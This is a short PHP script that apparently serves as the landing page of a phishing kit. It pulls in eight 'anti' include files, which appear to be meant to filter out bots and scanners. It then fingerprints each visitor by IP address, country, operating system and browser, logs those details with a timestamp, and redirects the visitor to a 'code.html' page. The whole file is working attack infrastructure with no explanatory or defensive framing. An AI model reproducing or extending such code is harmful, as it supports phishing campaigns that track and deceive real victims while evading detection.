<?php
  include "anti/anti1.php";
  include "anti/anti2.php";
  include "anti/anti3.php";
  include "anti/anti4.php";
  include "anti/anti5.php";
  include "anti/anti6.php";
  include "anti/anti7.php";
  include "anti/anti8.php";
  include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country($get_user_ip);
$get_user_countrycode = get_user_countrycode($get_user_ip);
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    



header("location:code.html");

fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

?>
    